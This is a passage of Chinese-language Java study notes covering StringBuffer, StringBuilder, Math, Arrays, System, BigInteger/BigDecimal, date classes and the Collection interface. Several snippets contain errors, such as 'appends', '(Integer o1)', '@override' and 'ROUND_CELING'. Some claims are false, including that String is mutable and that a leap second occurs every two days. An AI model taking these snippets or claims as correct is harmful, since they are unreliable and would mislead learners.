class="comment">//5.StringBuffer是一个final类，不能被继承</span></span><br></pre></td></tr></table></figure><h3 id="string和stringbuffer的对比"><a class="markdownIt-Anchor" href="#string和stringbuffer的对比">#</a> String 和 StringBuffer 的对比</h3><ol><li>String 保存的是字符串常量，里面的值不能更改，每次 String 类的更新，实际上是更改地址，效率比较低</li><li>StringBuffer 保存的是字符串变量，里面的值可以修改，每次 StringBuffer 的更新实际上可以更新内容，不用每次更改地址，效率较高（空间大小不够的时候会扩容，也就会更改地址）</li></ol><h3 id="stingbuffer的构造器"><a class="markdownIt-Anchor" href="#stingbuffer的构造器">#</a> StingBuffer 的构造器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">StringBuffer()<span class="comment">//创建一个大小为16的char[]，用于存放字符内容</span></span><br><span class="line"></span><br><span class="line">StringBuffer(CharSequence seq)<span class="comment">//构造一个字符串缓冲区，它包含与指定的CharSequence相同的字符</span></span><br><span class="line"></span><br><span class="line">StringBuffer(<span class="type">int</span> capacity)<span class="comment">//指定char[]的大小</span></span><br><span class="line">    </span><br><span class="line">StringBuffer(String str)<span class="comment">//通过给一个String来创建StringBuffer</span></span><br><span class="line"></span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="string和stringbuffer相互转换"><a class="markdownIt-Anchor" href="#string和stringbuffer相互转换">#</a> String 和 StringBuffer 相互转换</h3><h4 id="string-stringbuffer"><a class="markdownIt-Anchor" href="#string-stringbuffer">#</a> String —&gt; StringBuffer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;helllo&quot;</span>;</span><br><span class="line"><span class="comment">//way 1</span></span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(s);</span><br><span class="line"><span class="comment">//way 2</span></span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">b2.appends(s);</span><br></pre></td></tr></table></figure><h4 id="stringbuffer-string"><a class="markdownIt-Anchor" href="#stringbuffer-string">#</a> StringBuffer —&gt; String</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//way 1</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> b1.toString(); <span class="comment">//b1是[StringBuffer]</span></span><br><span class="line"><span class="comment">//way 2</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(b1);</span><br></pre></td></tr></table></figure><h3 id="stringbuffer类常见方法"><a class="markdownIt-Anchor" href="#stringbuffer类常见方法">#</a> StringBuffer 类常见方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuffer</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//增</span></span><br><span class="line">s.append(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">s.append(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">s.append(<span class="string">&quot;123&quot;</span>).append(<span class="number">100</span>).append(<span class="literal">true</span>).append(<span class="number">1.5</span>);</span><br><span class="line"><span class="comment">//删：左闭右开</span></span><br><span class="line">delete(start, end)</span><br><span class="line"><span class="comment">//改：将始终位置的内容替换为string，左闭右开</span></span><br><span class="line">replace(start, end, string)</span><br><span class="line"><span class="comment">//查：查找子串在字符串第一次出现的索引，找不到返回-1</span></span><br><span class="line">indexOf()</span><br><span class="line"><span class="comment">//插：在指定位置插入字符串</span></span><br><span class="line">insert(pos, string)</span><br><span class="line"><span class="comment">//获取长度：</span></span><br><span class="line">length</span><br></pre></td></tr></table></figure><h2 id="stringbuilder类"><a class="markdownIt-Anchor" href="#stringbuilder类">#</a> StringBuilder 类</h2><ol><li>一个可变的字符序列。此类提供一个与 StringBuffer 兼容的 API，但不保证同步。该类被设计用作 StringBuffer 的一个简易替换，用在字符串缓冲区被<strong>单个线程</strong>使用的时候。如果可能，建议优先采用该类，因为在大多数实现中，它比 StringBuffer 要快</li><li>在 StringBuilder 上的主要操作是 append 和 insert 方法，可重载这些方法，以接受任意类型的数据</li><li>StringBuilder 的常用方法和 StringBuffer 是一样的</li><li>StringBuilder 是 final 类，不能被继承</li><li>StringBuilder 对象字符序列也是存放在父类 AbstractStringBuilder 的 char [] value 中，所以也是存放在堆中</li><li>多线程使用有风险，源码中没有线程同步的操作，也就是没有 synchronized 关键字</li></ol><h2 id="stringstringbuffer和string-builder的对比"><a class="markdownIt-Anchor" href="#stringstringbuffer和string-builder的对比">#</a> String，StringBuffer 和 String Builder 的对比</h2><ol><li><p>String、StringBuffer 和 StringBuilder 都代表可变的字符序列，且方法一样</p></li><li><p>String：不可变字符序列，效率低，但是复用率高</p></li><li><p>StringBuffer：可变字符序列，效率较高（增删），线程安全</p></li><li><p>StringBuilder：可变字符序列，效率最高，但线程不安全</p></li><li><p>String 使用注意说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">s += <span class="string">&quot;b&quot;</span>;</span><br></pre></td></tr></table></figure><p>这串代码中，原本的字符串对象 &quot;a&quot; 是被丢弃了之后在产生的 &quot;ab&quot;，多次执行这种改变内容的操作会导致大量副本对象存留在内存中，降低效率，尤其是当这种操作在循环中时。所以在需要对 String 对象做大量的修改时，不要用 String</p></li></ol><h2 id="math类"><a class="markdownIt-Anchor" href="#math类">#</a> Math 类</h2><ol><li><p>abs 绝对值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">abs</span> <span class="operator">=</span> Math.abs(-<span class="number">1</span>);<span class="comment">//1</span></span><br></pre></td></tr></table></figure></li><li><p>pow 求幂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">pow</span> <span class="operator">=</span> Math.pow(<span class="number">2</span>, <span class="number">4</span>);<span class="comment">//2的四次方</span></span><br></pre></td></tr></table></figure></li><li><p>ceil 向上取整</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">ceil</span> <span class="operator">=</span> Math.ceil(-<span class="number">3.001</span>);<span class="comment">//-3.0</span></span><br></pre></td></tr></table></figure></li><li><p>floor 向下取整</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">floor</span> <span class="operator">=</span> Math.floor(-<span class="number">4.99</span>);<span class="comment">//-5.0</span></span><br></pre></td></tr></table></figure></li><li><p>round 四舍五入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">round</span> <span class="operator">=</span> Math.round(-<span class="number">5.001</span>);<span class="comment">//-5</span></span><br></pre></td></tr></table></figure></li><li><p>sqrt 开方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">sqrt</span> <span class="operator">=</span> Math.sqrt(<span class="number">9.0</span>)<span class="comment">//3.0</span></span><br></pre></td></tr></table></figure></li><li><p>random 求随机数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">random</span> <span class="operator">=</span> Math.random();<span class="comment">//返回一个[0,1)之间的随机小鼠</span></span><br><span class="line"><span class="comment">//如果要让它取到一个设定范围内的整数，比如[2, 7]，可以这么写</span></span><br><span class="line"><span class="type">int</span> <span class="variable">random</span> <span class="operator">=</span> (<span class="type">int</span>)(<span class="number">2</span> + Math.random() * (<span class="number">7</span> - <span class="number">2</span> + <span class="number">1</span>));<span class="comment">//因为需要取整，所以右边需要加1</span></span><br></pre></td></tr></table></figure></li><li><p>max、min 求最值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Math.max(<span class="number">1</span>, <span class="number">10</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="arrays类"><a class="markdownIt-Anchor" href="#arrays类">#</a> Arrays 类</h2><p>Arrays 类用于管理或操作数组（比如排序、搜索）</p><ol><li><p>toString：返回数组的字符串形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Arrays.toString(arr);</span><br></pre></td></tr></table></figure></li><li><p>sort 排序：自然排序和定制排序（忘记了可看 p483）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自然排序</span></span><br><span class="line">Integer arr[] = &#123;<span class="number">1</span>, -<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>&#125;;</span><br><span class="line">Arrays.sort(arr);</span><br><span class="line"><span class="comment">//定制排序，传入一个接口Comparator实现定制排序</span></span><br><span class="line">Arrays.sort(arr, <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> (Integer o1);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> (Integer o2);</span><br><span class="line">        <span class="keyword">return</span> i1 - i2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//实现了Comparator接口的匿名内部类，要求实现compare方法</span></span><br></pre></td></tr></table></figure></li><li><p>binarySearch：通过二分法进行查找，只能对有序数组使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Arrays.binarySearch(arr, <span class="number">3</span>);</span><br></pre></td></tr></table></figure></li><li><p>copyOf 数组元素复制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer[] newArr = Arrays.copyOf(arr, arr.length);</span><br></pre></td></tr></table></figure></li><li><p>fill：数组元素的填充</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Integer[] num = <span class="keyword">new</span> <span class="title class_">Integer</span>[] &#123;<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>&#125;;</span><br><span class="line">Arrays.fill(num, <span class="number">99</span>);<span class="comment">//将数组用99填充</span></span><br></pre></td></tr></table></figure></li><li><p>equals：比较两个数组的元素内容是否完全一致</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">equals</span>  <span class="operator">=</span> Arrays.equals(arr1, arr2);</span><br></pre></td></tr></table></figure></li><li><p>asList：将一组值转换成 list</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; asList = Arrays.asList(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>);<span class="comment">//asList会将这些数据转为一个List集合</span></span><br><span class="line">System.out.println(<span class="string">&quot;asList=&quot;</span> + asList);</span><br><span class="line"><span class="comment">//返回asList编译类型List(接口)</span></span><br><span class="line"><span class="comment">//asList的运行类型是java.util.Arrays$ArrayList</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="system类"><a class="markdownIt-Anchor" href="#system类">#</a> System 类</h2><ol><li><p>exit：退出当前程序</p></li><li><p>arraycopy：复制数组元素，比较适合底层调用，一般情况还是用 Arrays.copyOf。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] src = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] dest = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">System.arraycopy(src, <span class="number">0</span>, dest, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//把src从第0个位置开始的元素，复制给dest，从0位置开始，复制3个元素</span></span><br></pre></td></tr></table></figure></li><li><p>currentTimeMillens：返回当前时间距离 1970-1-1 的毫秒数</p></li><li><p>gc：运行垃圾回收机制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.gc();</span><br></pre></td></tr></table></figure></li></ol><h2 id="biginteger和bigdecimal类"><a class="markdownIt-Anchor" href="#biginteger和bigdecimal类">#</a> BigInteger 和 BigDecimal 类</h2><ol><li>BigInteger 适合保存比较大的整型</li><li>BigDecimal 适合保存精度更高的浮点型？</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;9999999999999999999999&quot;</span>);</span><br><span class="line"><span class="type">BigInteger</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;100&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;15.156448946513165453&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;45.166431135&quot;</span>)</span><br></pre></td></tr></table></figure><p>加减乘除不能直接用传统的方法，要用下面的方法来进行</p><h3 id="常见方法"><a class="markdownIt-Anchor" href="#常见方法">#</a> 常见方法</h3><ol><li><p>add</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">add</span> <span class="operator">=</span> bigInteger.add(b);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">add</span> <span class="operator">=</span> bigdecimal.add(b);</span><br></pre></td></tr></table></figure></li><li><p>subtract：减</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">subtract</span> <span class="operator">=</span> bigInteger.subtract(b);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">subtract</span> <span class="operator">=</span> bigdecimal.subtract(b);</span><br></pre></td></tr></table></figure></li><li><p>multiply</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">multiply</span> <span class="operator">=</span> bigInteger.multiply(b);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">multiply</span> <span class="operator">=</span> bigdecimal.multiply(b);</span><br></pre></td></tr></table></figure></li><li><p>divide：除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BigInteger</span> <span class="variable">divide</span> <span class="operator">=</span> bigInteger.divide(b);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">divide</span> <span class="operator">=</span> bigdecimal.divide(b);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在除法中可能会出现无限循环小数，这里可以指定精度：BigDecimal.ROUND_CELING</span></span><br><span class="line">System.out.println(<span class="string">&quot;bigDecimal.divide(b, a.ROUND_CELING)&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="日期类"><a class="markdownIt-Anchor" href="#日期类">#</a> 日期类</h2><ol><li>Date：精确到毫秒</li><li>SimpleDateFormat：格式和解析日期的类。它允许进行格式化（日期 -&gt; 文本），解析（文本 -&gt; 日期）和规范化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Date</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="comment">//默认输出格式一般是国外的惯用格式，这里可以格式化</span></span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">day</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日 hh:mm:ss E&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> day.format(d1);</span><br><span class="line">System.out.println(<span class="string">&quot;当前日期为：&quot;</span> + format);</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以通过毫秒数来指定此毫秒数对应的时间</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">923898</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;d2=&quot;</span> + d2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//还可以把一个格式化的String转换成对应的Date。(格式一定要正确)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;1996年01月01日 10:20:30 星期一&quot;</span>;</span><br><span class="line"><span class="type">Date</span> <span class="variable">parse</span> <span class="operator">=</span> day.parse(s);</span><br></pre></td></tr></table></figure><h3 id="第二代日期类"><a class="markdownIt-Anchor" href="#第二代日期类">#</a> 第二代日期类</h3><ol><li><p>Calendar 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Calendar</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Cloneable, Comparable&lt;Calendar&gt;</span><br></pre></td></tr></table></figure></li><li><p>Calendar 类是一个抽象类，为 YEAR, MONTH, DAY_OF_MONTH, HOUR 等日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Calendar是一个抽象类，且构造器是私有的，所以可以通过getInstance()来获取实例</span></span><br><span class="line"><span class="comment">//这个就比较灵活，可以需要什么就get什么，随意组合</span></span><br><span class="line"><span class="type">Calendar</span> <span class="variable">c</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line">System.out.println(c.get(Calendar.DAY_OF_WEEK));</span><br><span class="line">System.out.println(c.get(Calendar.YEAR));</span><br><span class="line">System.out.println(c.get(Calendar.MONTH) + <span class="number">1</span>);<span class="comment">//月要加1，因为Calendar返回月的时候是从0开始编号的</span></span><br><span class="line">System.out.println(c.get(Calendar.DAY_OF_MONTH));</span><br><span class="line">System.out.println(c.get(Calendar.HOUR));</span><br><span class="line">System.out.println(c.get(Calendar.MINUTE));</span><br><span class="line">System.out.println(c.get(Calendar.SECOND));</span><br></pre></td></tr></table></figure><h3 id="第三代日期类"><a class="markdownIt-Anchor" href="#第三代日期类">#</a> 第三代日期类</h3><p>JDK 1.0 中包含了一个 java.util.Date 类，但它的大多数方法已经在 JDK 1.1 引入 Calendar 类后被弃用了，而 Calendar 类也存在一些问题</p><ol><li>可变性：日期和时间这样的类应该是不可变的</li><li>偏移性：Date 中的年份是从 1900 年开始的，而月份都从 0 开始</li><li>格式化：格式化只对 Date 有用，Calendar 不可以</li><li>线程不安全，不能处理闰秒（每隔 2 天，多出 1s）</li></ol><h4 id="第三代日期类常见方法"><a class="markdownIt-Anchor" href="#第三代日期类常见方法">#</a> 第三代日期类常见方法</h4><p>LocalDate (日期 / 年月日)、LocalTime (时间 / 时分秒)、LocalDateTime (日期时间) JDK8 加入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">LocalDateTime</span> <span class="variable">ldt</span> <span class="operator">=</span> LocalDateTime.now();</span><br><span class="line">System.out.println(ldt);</span><br><span class="line">System.out.println(ldt.getYear());</span><br><span class="line">System.out.println(ldt.getMonth());</span><br><span class="line">System.out.println(ldt.getDayOfMonth());</span><br><span class="line">System.out.println(ldt.getHour());</span><br></pre></td></tr></table></figure><h4 id="格式日期类datetimeformatter"><a class="markdownIt-Anchor" href="#格式日期类datetimeformatter">#</a> 格式日期类 DateTimeFormatter</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先创建一个DateTimeFormatter对象</span></span><br><span class="line"><span class="type">DateTimeFormatter</span> <span class="variable">dtf</span> <span class="operator">=</span> DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy年MM月dd日 HH小时mm分钟ss秒&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">format</span> <span class="operator">=</span> dtf.format(ldt)</span><br></pre></td></tr></table></figure><h4 id="时间戳"><a class="markdownIt-Anchor" href="#时间戳">#</a> 时间戳</h4><p>类似于 Date，提供了一系列和 Date 类转换的方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Instant</span> <span class="variable">now</span> <span class="operator">=</span> Instant.now();</span><br><span class="line"><span class="comment">//通过方法转换：</span></span><br><span class="line"><span class="comment">//Instant --&gt; Date</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> Date.from(instant);</span><br><span class="line"><span class="comment">//Date --&gt; Instant</span></span><br><span class="line"><span class="type">Instant</span> <span class="variable">instant</span> <span class="operator">=</span> date.toInstant();</span><br></pre></td></tr></table></figure><h4 id="更多方法"><a class="markdownIt-Anchor" href="#更多方法">#</a> 更多方法</h4><ol><li>LocalDateTime 类</li><li>MonthDay 类：检查重复事件</li><li>是否是闰年</li><li>增加日期的某个部分</li><li>使用 plus 方法增加时间的某个部分</li><li>使用 minus 方法查看一年前和一年后的日期</li></ol><h1 id="集合collection"><a class="markdownIt-Anchor" href="#集合collection">#</a> 集合（Collection）</h1><p>集合主要是两组，即单列集合和双列集合。</p><ol><li>Collection 接口有两个重要的子接口，List 和 Set，他们实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放 K-V</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ArrayList</span> <span class="variable">al</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">al.add(<span class="string">&quot;jack&quot;</span>);</span><br><span class="line">al.add(<span class="string">&quot;tom&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hm.put(<span class="string">&quot;No.1&quot;</span>, <span class="string">&quot;tch&quot;</span>);</span><br><span class="line">hm.put(<span class="string">&quot;No.2&quot;</span>, <span class="string">&quot;hct&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="集合和数组的对比"><a class="markdownIt-Anchor" href="#集合和数组的对比">#</a> 集合和数组的对比</h2><p>数组：</p><ol><li>长度开始时必须指定，且指定后就不能修改</li><li>保存的必须为同一类型的元素</li><li>使用数组进行增加元素的示意代码比较麻烦</li></ol><p>而集合：</p><ol><li>可以动态保存任意多个对象，使用比较方便</li><li>提供了一系列方便的操作对象的方法：add、remove、set、get 等</li><li>使用集合添加，删除新元素的示意代码，更加简洁</li></ol><h2 id="collection接口和常用方法"><a class="markdownIt-Anchor" href="#collection接口和常用方法">#</a> Collection 接口和常用方法</h2><h3 id="collection接口实现类的特点"><a class="markdownIt-Anchor" href="#collection接口实现类的特点">#</a> Collection 接口实现类的特点</h3><p><code>public interface Collection&lt;E&gt; extends Iterable&lt;E&gt;</code></p><ol><li>Collection 实现子类可以存放多个元素，每个元素可以是 Object</li><li>有些 Collection 的实现类，可以存放重复的元素，有些不可以</li><li>Collection 的实现类，有些是有序的（List），有些是无序的（Set）</li><li>Collection 接口没有直接的实现子类，是通过它的子接口 Set 和 List 来实现的</li></ol><h3 id="collection接口常用方法"><a class="markdownIt-Anchor" href="#collection接口常用方法">#</a> Collection 接口常用方法</h3><p>以实现子类 ArrayList 来演示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br></pre></td></tr></table></figure><ol><li><p>add：添加单个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list.add(<span class="string">&quot;tch&quot;</span>);</span><br><span class="line">list.add(<span class="number">10</span>);</span><br><span class="line">list.add(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li><li><p>remove：删除指定元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list.remove(<span class="number">0</span>);<span class="comment">//删除索引位置为0的元素</span></span><br><span class="line">list.remove(<span class="string">&quot;tch&quot;</span>);<span class="comment">//指定删除</span></span><br></pre></td></tr></table></figure></li><li><p>contains：查找元素是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.contains(<span class="string">&quot;tch&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>size：获取元素个数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.size();</span><br></pre></td></tr></table></figure></li><li><p>isEmpty：判断是否为空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.isEmpty();</span><br></pre></td></tr></table></figure></li><li><p>clear：清空</p><figure class="highlight 